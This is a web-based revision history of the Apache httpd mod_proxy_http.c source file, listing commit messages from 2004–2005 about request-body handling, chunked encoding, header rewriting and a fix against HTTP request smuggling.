([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219430&r2=219533&diff_format=h))
```

  Yet another snafu in body handling.  We need to clearly avoid any
  ap_get_brigade or request body processing in every *subrequest*
  proxy action.  The new code introduced more chaos because we read
  the request body irrespective of any bogus header handling bugs.

  This requires a goto, and yes, that sucks :)  But this is one of those
  oddball cases where jumping away makes more sense than tons of indented
  code, IMHO.  And if you count the number of goto's I've committed to
  httpd, you know I avoid them like the plague.

  I woulda' suggestd to jorton to take a flying carnal act, except that
  each time he points me back to the 2.0 patch, I catch another entirely
  bogus choice within the old/new httpd-2.x request body code :)

  I've bumped the 2.0 patch to correspond; see
  <http://people.apache.org/~wrowe/httpd-2.0-proxy-request-4.patch>

```

---

Revision [**219430**](/viewvc?view=revision&revision=219430) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219430&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219430&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=219430))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=219430)

Modified
*Mon Jul 18 00:16:52 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 64745 byte(s)

Diff to [previous 219224](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219224&r2=219430)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219224&r2=219430&diff_format=h))
```

  Fix broken while () {} loops (lingering code from the old logic),
  closes an infinite loop in the most recent version.  Init the cl_val
  to prevent failure of zero length bodies in the most recent version.

  Use 'request body' instead of 'data' to describe any errors.

  Finally, loop around ap_get_brigade to grab multiple chunks that still
  fall below our MAX_MEM_SPOOL threshold, since the chunk decoding from
  the client will pass up just one small chunk per ap_get_brigade call.

```

---

Revision [**219224**](/viewvc?view=revision&revision=219224) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219224&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219224&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=219224))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=219224)

Modified
*Fri Jul 15 17:39:27 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 64113 byte(s)

Diff to [previous 219223](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219223&r2=219224)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219223&r2=219224&diff_format=h))
```

  On Roy's suggestion; why wait to try to clear out the input
  stream if it is smaller than MAX_MEM_SPOOL?  Do this upfront
  before dispatching to a body handler.

  This means changing each of the three body pumps to presume
  a preexisting input_brigade was already loaded, so turn around
  their loop conditions.

```

---

Revision [**219223**](/viewvc?view=revision&revision=219223) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219223&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219223&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=219223))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=219223)

Modified
*Fri Jul 15 17:37:56 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 62728 byte(s)

Diff to [previous 219221](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219221&r2=219223)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219221&r2=219223&diff_format=h))
```

  Fix a style problem; b is ambigous (is it a brigade or bucket?)
  bb is far less ambigous.

```

---

Revision [**219221**](/viewvc?view=revision&revision=219221) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219221&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219221&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=219221))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=219221)

Modified
*Fri Jul 15 17:32:14 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 62723 byte(s)

Diff to [previous 219057](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219057&r2=219221)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=219057&r2=219221&diff_format=h))
```

  leaving force-proxy-request-1.0 for broken clients, revert my
  patch for forcing an HTTP/1.0 proxy request, if the client
  request is HTTP/1.0, per Roy.

```

---

Revision [**219057**](/viewvc?view=revision&revision=219057) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219057&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=219057&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=219057))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=219057)

Modified
*Thu Jul 14 16:17:56 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 62850 byte(s)

Diff to [previous 218978](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=218978&r2=219057)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=218978&r2=219057&diff_format=h))
```

  Missed an edge case; once we know the C-L didn't match, it's
  time to shut down the body already.  Finish reading from the
  client but do nothing else, returning an error.

```

---

Revision [**218978**](/viewvc?view=revision&revision=218978) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=218978&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=218978&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=218978))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=218978)

Modified
*Thu Jul 14 03:42:22 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 62423 byte(s)

Diff to [previous 216159](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=216159&r2=218978)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=216159&r2=218978&diff_format=h))
```

  How can I fix thee?  let me count the ways...

  * pass a chunked body always (no-body requests don't go chunked).

  * validate that the C-L counted body length doesn't change.

  * follow RFC 2616 for C-L / T-E in the request body C-L / T-E
    election logic.

  * do not forward HTTP/1.0 requests as HTTP/1.1, unless the admin
    configures force-proxy-request-1.1

  * conn was illegible, use 2.0's p_conn.

```

---

Revision [**216159**](/viewvc?view=revision&revision=216159) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=216159&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=216159&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=216159))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=216159)

Modified
*Wed Jul 13 14:06:24 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 60904 byte(s)

Diff to [previous 216156](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=216156&r2=216159)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=216156&r2=216159&diff_format=h))
```

  Fix two fat-fingered typos from commit 216156.  Code matches previous
  behavior now; time to start fixing.

```

---

Revision [**216156**](/viewvc?view=revision&revision=216156) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=216156&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=216156&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=216156))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=216156)

Modified
*Wed Jul 13 13:59:32 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 60884 byte(s)

Diff to [previous 216111](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=216111&r2=216156)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=216111&r2=216156&diff_format=h))
```

  send_request_body and indentation made it very difficult to follow
  all the mistakes in this code.  Fold send_request_body into reindent
  to make the pattern clear and skip some extra string handling.
  Little functional change, that comes next.

```

---

Revision [**216111**](/viewvc?view=revision&revision=216111) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=216111&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=216111&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=216111))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=216111)

Modified
*Wed Jul 13 04:43:59 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 61266 byte(s)

Diff to [previous 209836](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=209836&r2=216111)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=209836&r2=216111&diff_format=h))
```

  End abuse of apr_strnat[case]cmp - it isn't str[case]cmp.

  Unsure if apr_strnatcasecmp(conf_ip, uri_ip) was intentional, on the
  off chance that the left or right hand ip string happens to contain
  leading zeros.

```

---

Revision [**209836**](/viewvc?view=revision&revision=209836) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=209836&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=209836&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=209836))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=209836)

Modified
*Fri Jul 8 16:25:54 2005 UTC*
(19 years, 6 months ago)
by *wrowe*

File length: 61378 byte(s)

Diff to [previous 193205](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=193205&r2=209836)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=193205&r2=209836&diff_format=h))
```

  Fix a ton of wrong/silly indention, and clarify the fix-notes

```

---

Revision [**193205**](/viewvc?view=revision&revision=193205) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=193205&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=193205&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=193205))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=193205)

Modified
*Thu Jun 23 19:20:29 2005 UTC*
(19 years, 7 months ago)
by *trawick*

File length: 61358 byte(s)

Diff to [previous 159671](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=159671&r2=193205)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=159671&r2=193205&diff_format=h))
```
proxy HTTP: If a response contains both Transfer-Encoding and a
Content-Length, remove the Content-Length and don't reuse the
connection, stopping some HTTP Request smuggling attacks.

```

---

Revision [**159671**](/viewvc?view=revision&revision=159671) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=159671&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=159671&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=159671))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=159671)

Modified
*Fri Apr 1 09:30:01 2005 UTC*
(19 years, 10 months ago)
by *jorton*

File length: 60506 byte(s)

Diff to [previous 159534](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=159534&r2=159671)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=159534&r2=159671&diff_format=h))
```
* modules/proxy/mod_proxy_http.c (ap_proxy_http_process_response):
Don't send an EOS after an interim response.

```

---

Revision [**159534**](/viewvc?view=revision&revision=159534) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=159534&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=159534&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=159534))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=159534)

Modified
*Wed Mar 30 23:09:32 2005 UTC*
(19 years, 10 months ago)
by *striker*

File length: 60483 byte(s)

Diff to [previous 159533](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=159533&r2=159534)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=159533&r2=159534&diff_format=h))
```
* modules/proxy/mod_proxy_http.c

  (ap_proxy_http_process_response): Fix a comment.

```

---

Revision [**159533**](/viewvc?view=revision&revision=159533) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=159533&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=159533&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=159533))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=159533)

Modified
*Wed Mar 30 22:58:08 2005 UTC*
(19 years, 10 months ago)
by *striker*

File length: 60495 byte(s)

Diff to [previous 157478](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=157478&r2=159533)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=157478&r2=159533&diff_format=h))
```
* modules/proxy/mod_proxy_http.c

  (ap_proxy_http_process_response): When there are only headers and no body,
   give the remainder of the output filters a chance by pushing an EOS bucket
   through the filter stack.

```

---

Revision [**157478**](/viewvc?view=revision&revision=157478) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=157478&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=157478&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=157478))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=157478)

Modified
*Mon Mar 14 22:22:58 2005 UTC*
(19 years, 10 months ago)
by *jerenkrantz*

File length: 60035 byte(s)

Diff to [previous 155209](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=155209&r2=157478)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=155209&r2=157478&diff_format=h))
```
mod_proxy: Add proxy-sendextracrlf option to send an extra CRLF at the
end of the request body to work with really old HTTP servers.

* modules/proxy/mod_proxy_http.c
  (stream_reqbody_cl, spool_reqbody_cl): If proxy-sendextracrlf option is
  present, append a CRLF to the body stream that isn't counted against CL.

```

---

Revision [**155209**](/viewvc?view=revision&revision=155209) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=155209&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=155209&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=155209))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=155209)

Modified
*Thu Feb 24 16:52:34 2005 UTC*
(19 years, 11 months ago)
by *jorton*

File length: 59539 byte(s)

Diff to [previous 152676](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=152676&r2=155209)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=152676&r2=155209&diff_format=h))
```
* modules/proxy/mod_proxy_http.c (ap_proxy_http_process_response): Fix
spurious error at EOF.

PR: 33615

```

---

Revision [**152676**](/viewvc?view=revision&revision=152676) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=152676&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=152676&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=152676))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=152676)

Modified
*Tue Feb 8 16:08:53 2005 UTC*
(19 years, 11 months ago)
by *jim*

File length: 59440 byte(s)

Diff to [previous 151722](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151722&r2=152676)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151722&r2=152676&diff_format=h))
```
If we rec' a bad response header line, ignore what we've
rec'd so far and force BAD_GATEWAY.

```

---

Revision [**151722**](/viewvc?view=revision&revision=151722) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151722&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151722&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=151722))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=151722)

Modified
*Mon Feb 7 15:41:28 2005 UTC*
(19 years, 11 months ago)
by *jim*

File length: 59397 byte(s)

Diff to [previous 151408](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151408&r2=151722)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151408&r2=151722&diff_format=h))
```
Better handle the case where ProxyBadHeader StartBody is
in effect and we think we've started reading in the
response body. Take advantage of the fact that the
line read is still in buffer (and document that)
to allow us to add to the bb.

```

---

Revision [**151408**](/viewvc?view=revision&revision=151408) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151408&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151408&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=151408))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=151408)

Modified
*Fri Feb 4 20:28:49 2005 UTC*
(19 years, 11 months ago)
by *jerenkrantz*

File length: 58628 byte(s)

Diff to [previous 151246](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151246&r2=151408)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151246&r2=151408&diff_format=h))
```
Update copyright year to 2005 and standardize on current copyright owner line.

```

---

Revision [**151246**](/viewvc?view=revision&revision=151246) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151246&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151246&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=151246))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=151246)

Modified
*Thu Feb 3 23:04:04 2005 UTC*
(19 years, 11 months ago)
by *striker*

File length: 58592 byte(s)

Diff to [previous 151238](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151238&r2=151246)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151238&r2=151246&diff_format=h))
```
Also translate Destination headers when ProxyPassReverse'd

* modules\proxy\mod_proxy_http.c

  (process_proxy_header): reverse map Destination header.

  NOTE: This is some darn nasty looking code...

* modules\proxy\ajp_header.c

  (ajp_unmarshal_response): reverse map Destination header.

```

---

Revision [**151238**](/viewvc?view=revision&revision=151238) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151238&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151238&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=151238))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=151238)

Modified
*Thu Feb 3 21:56:30 2005 UTC*
(19 years, 11 months ago)
by *striker*

File length: 58533 byte(s)

Copied from: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=151229) revision 151229

Diff to [previous 151168](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151168&r2=151238)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151168&r2=151238&diff_format=h))
```
Rename proxy modules.

* modules\proxy\mod_proxy_ajp.c
* modules\proxy\mod_proxy_balancer.c
* modules\proxy\mod_proxy_connect.c
* modules\proxy\mod_proxy_ftp.c
* modules\proxy\mod_proxy_http.c

  Renamed from proxy_{ajp,balancer,connect,ftp,http}.c

* modules\proxy\mod_proxy_ajp.dsp
* modules\proxy\mod_proxy_balancer.dsp
* modules\proxy\mod_proxy_connect.dsp
* modules\proxy\mod_proxy_ftp.dsp
* modules\proxy\mod_proxy_http.dsp

  Update references to renamed files.

* modules\proxy\NWGNUproxyajp
* modules\proxy\NWGNUproxybalancer
* modules\proxy\NWGNUproxycon
* modules\proxy\NWGNUproxyftp
* modules\proxy\NWGNUproxyhtp

  Update references to renamed files.

```

---

Revision [**151168**](/viewvc?view=revision&revision=151168) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151168&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151168&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=151168))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=151168)

Modified
*Thu Feb 3 16:03:42 2005 UTC*
(19 years, 11 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=151168)

File length: 58533 byte(s)

Diff to [previous 151153](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151153&r2=151168)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=151153&r2=151168&diff_format=h))
```
proxy HTTP: Rework the handling of request bodies to handle
chunked input and input filters which modify content length, and
avoid spooling arbitrary-sized request bodies in memory.

This is a merge of the proxy-reqbody branch into the trunk.

Justin had the protocol issues resolved in 2.1-dev, but not the
memory issue.  The new implementation makes an effort to
stream the request body whenever possible.

Thanks to Allan Edwards for a critical bug fix, Greg Ames
for some style corrections, Justin for a needed commentary
addition, Jan Kratochvil for testing the analogous 2.0.x patch
with the SonyEricsson P900 phone, and reviews by all these
folks + JimJag.

PR: 15859

```

---

Revision [**151153**](/viewvc?view=revision&revision=151153) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151153&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=151153&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=151153))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=151153)

Modified
*Thu Feb 3 13:38:24 2005 UTC*
(19 years, 11 months ago)
by *jim*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=151153)

File length: 47426 byte(s)

Diff to [previous 125612](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=125612&r2=151153)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=125612&r2=151153&diff_format=h))
```
Close PR 32459, 15207. API change for PROXY_DECLARE ap_proxy_canonenc()

```

---

Revision [**125612**](/viewvc?view=revision&revision=125612) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=125612&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=125612&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=125612))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=125612)

Modified
*Wed Jan 19 11:05:57 2005 UTC*
(20 years ago)
by *jorton*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=125612)

File length: 47423 byte(s)

Diff to [previous 124901](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=124901&r2=125612)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=124901&r2=125612&diff_format=h))
```
* modules/proxy/proxy_http.c (ap_proxy_http_process_response): Handle
aborted connections correctly: abort if c->aborted is set.

* modules/proxy/proxy_ftp.c (proxy_ftp_handler): Likewise.

PR: 32443
Submitted by: Janne Hietamäki, Joe Orton

```

---

Revision [**124901**](/viewvc?view=revision&revision=124901) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=124901&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=124901&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=124901))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=124901)

Modified
*Tue Jan 11 08:35:46 2005 UTC*
(20 years ago)
by *striker*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=124901)

File length: 47342 byte(s)

Diff to [previous 123727](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=123727&r2=124901)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=123727&r2=124901&diff_format=h))
```
Rewrite Cookies and other headers in mod_proxy_ajp as configured with
ProxyPassReverse and ProxyPassReverseCookiePath.

* modules/proxy/proxy_ajp.c

  (ap_proxy_ajp_request): Update call to ajp_parse_header().

* modules/proxy/ajp.h

  (ajp_msg_get_string): constify argument.

  (ajp_parse_header): Add conf argument.

* modules/proxy/proxy_util.c

  (ap_proxy_location_reverse_map): Promoted from mod_proxy_http.

  (ap_proxy_cookie_reverse_map): Promoted from mod_proxy_http;
    renamed from proxy_cookie_reverse_map.

* modules/proxy/ajp_msg.c

  (ajp_msg_get_string): constify argument.

* modules/proxy/proxy_http.c

  (ap_proxy_location_reverse_map, proxy_cookie_reverse_map: Removed.

  (process_proxy_header): Update header mapping table to reference the now
    public functions.

* modules/proxy/ajp_header.c

  (ajp_unmarshal_response): And conf argument.  Reverse map cookies and
    other headers.

  (ajp_parse_header): Update call to ajp_unmarshal_response().

* modules/proxy/mod_proxy.h

  (ap_proxy_location_reverse_map, ap_proxy_cookie_reverse_map): Declare
    functions that have been promoted to be public.

  (ap_proxy_header_reverse_map_fn): Typedef for the signature of the above
    two functions (currently used in mod_proxy_http).

```

---

Revision [**123727**](/viewvc?view=revision&revision=123727) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=123727&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=123727&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=123727))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=123727)

Modified
*Thu Dec 30 16:31:13 2004 UTC*
(20 years, 1 month ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=123727)

File length: 51543 byte(s)

Diff to [previous 111858](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=111858&r2=123727)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=111858&r2=123727&diff_format=h))
```
mod_proxy: Fix a request corruption problem and a buffering problem
which sometimes prevented proxy-sendchunks from working.

strlen() couldn't be used since no space had been allocated
for trailing NUL, so occasionally the T-E header field contained
garbage and a 400 error would be returned by the origin server.

The lack of a flush bucket after the final "0\r\n\r\n" was a
showstopper for my simple tests (reverse proxy to Apache 1.3 +
custom module which read the body).

```

---

Revision [**111858**](/viewvc?view=revision&revision=111858) -
